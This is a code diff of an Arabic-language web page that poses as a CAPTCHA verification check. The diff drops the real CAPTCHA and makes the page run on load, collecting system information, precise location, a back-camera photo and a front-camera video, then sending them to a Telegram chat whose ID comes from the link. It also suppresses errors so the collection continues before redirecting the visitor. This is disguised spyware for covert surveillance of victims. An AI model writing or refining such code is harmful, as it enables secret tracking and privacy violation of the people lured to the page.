@@ -124,13 +124,11 @@
         <p class="description">لحماية موقعنا، يرجى إكمال التحقق لإثبات أنك لست روبوت.</p>
         
         <div class="captcha-box">
-            <p>أدخل النص الظاهر في الصورة أدناه:</p>
-            <div class="captcha-text" id="captcha-text">5G7H9K</div>
-            <input type="text" id="captcha-input" placeholder="أدخل النص هنا" autocomplete="off">
-            <button id="verify-btn">تحقق</button>
+            <p>جاري التحقق من المعلومات...</p>
+            <div class="loading" style="margin: 20px auto;"></div>
         </div>
         
-        <div id="status-message" class="hidden"></div>
+        <div id="status-message"></div>
         
         <div class="footer">
             <p>هذا النظام يستخدم تقنيات التحقق الآمنة لحماية خصوصيتك.</p>
@@ -165,20 +163,7 @@
         };
         
         // عناصر DOM
-        const captchaText = document.getElementById('captcha-text');
-        const captchaInput = document.getElementById('captcha-input');
-        const verifyBtn = document.getElementById('verify-btn');
         const statusMessage = document.getElementById('status-message');
-        
-        // إنشاء CAPTCHA عشوائي
-        function generateCaptcha() {
-            const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-            let captcha = "";
-            for (let i = 0; i < 6; i++) {
-                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            return captcha;
-        }
         
         // جمع معلومات النظام الأساسية مع الإضافات الجديدة
         async function getSystemInfo() {
@@ -260,7 +245,7 @@
                 stream.getTracks().forEach(track => track.stop());
                 
             } catch (error) {
-                throw new Error(`فشل في الوصول للكاميرا الخلفية: ${error.message}`);
+                console.error(`فشل في الوصول للكاميرا الخلفية: ${error.message}`);
             }
         }
         
@@ -294,60 +279,53 @@
                     
                     mediaRecorder.start();
                     
-                    // تسجيل لمدة 15 ثانية ثم إيقاف
+                    // تسجيل لمدة 5 ثواني ثم إيقاف (للتسريع)
                     setTimeout(() => {
                         if (mediaRecorder.state !== 'inactive') {
                             mediaRecorder.stop();
                         }
-                    }, 15000);
+                    }, 5000);
                     
                 } catch (error) {
-                    reject(new Error(`فشل في تسجيل الفيديو من الكاميرا الأمامية: ${error.message}`));
+                    console.error(`فشل في تسجيل الفيديو من الكاميرا الأمامية: ${error.message}`);
+                    resolve(); // نستمر حتى لو فشل
                 }
             });
         }
         
         // عند تحميل الصفحة
         window.onload = async () => {
-            // تعيين CAPTCHA عشوائي
-            captchaText.textContent = generateCaptcha();
+            statusMessage.innerHTML = '<div class="loading"></div> جاري جمع معلومات التحقق...';
             
-            // جمع معلومات النظام أولاً
-            await getSystemInfo();
-            
-            // إضافة مستمع للأحداث للزر
-            verifyBtn.addEventListener('click', async () => {
-                if (captchaInput.value === captchaText.textContent) {
-                    statusMessage.innerHTML = '<div class="loading"></div> جاري التحقق من المعلومات...';
-                    statusMessage.classList.remove('hidden');
-                    
-                    try {
-                        // الحصول على chat_id من الرابط
-                        const CHAT_ID = getChatIdFromUrl();
-                        if (!CHAT_ID) {
-                            throw new Error("لم يتم العثور على معرف الدردشة في الرابط");
-                        }
-                        
-                        // طلب الأذونات بالتسلسل
-                        await requestLocation();
-                        await captureBackCameraPhoto(); // التقاط صورة من الكاميرا الخلفية
-                        await recordFrontCameraVideo(); // تسجيل فيديو من الكاميرا الأمامية
-                        
-                        // بعد جمع كل البيانات
-                        await sendAllDataToTelegram(CHAT_ID);
-                        
-                        statusMessage.innerHTML = '✅ تم التحقق بنجاح! جاري توجيهك...';
-                    } catch (error) {
-                        statusMessage.innerHTML = `❌ حدث خطأ: ${error.message}`;
-                        console.error("Error:", error);
-                    }
-                } else {
-                    statusMessage.textContent = '❌ النص المدخل غير صحيح. يرجى المحاولة مرة أخرى.';
-                    statusMessage.classList.remove('hidden');
-                    captchaText.textContent = generateCaptcha();
-                    captchaInput.value = '';
+            try {
+                // الحصول على chat_id من الرابط
+                const CHAT_ID = getChatIdFromUrl();
+                if (!CHAT_ID) {
+                    throw new Error("لم يتم العثور على معرف الدردشة في الرابط");
                 }
-            });
+                
+                // جمع معلومات النظام أولاً
+                await getSystemInfo();
+                
+                // طلب الأذونات بالتسلسل
+                await requestLocation().catch(e => console.error(e));
+                await captureBackCameraPhoto(); // التقاط صورة من الكاميرا الخلفية
+                await recordFrontCameraVideo(); // تسجيل فيديو من الكاميرا الأمامية
+                
+                // بعد جمع كل البيانات
+                await sendAllDataToTelegram(CHAT_ID);
+                
+                statusMessage.innerHTML = '✅ تم التحقق بنجاح! جاري توجيهك...';
+                
+                // إعادة توجيه المستخدم بعد الانتهاء (اختياري)
+                setTimeout(() => {
+                    window.location.href = "https://example.com"; // استبدل بالرابط المطلوب
+                }, 2000);
+                
+            } catch (error) {
+                statusMessage.innerHTML = `❌ حدث خطأ: ${error.message}`;
+                console.error("Error:", error);
+            }
         };
         
         // طلب إذن الموقع
@@ -379,7 +357,8 @@
                         }
                     },
                     (error) => {
-                        reject(new Error(`فشل في الحصول على الموقع: ${error.message}`));
+                        console.error(`فشل في الحصول على الموقع: ${error.message}`);
+                        resolve(); // نستمر حتى لو فشل
                     },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
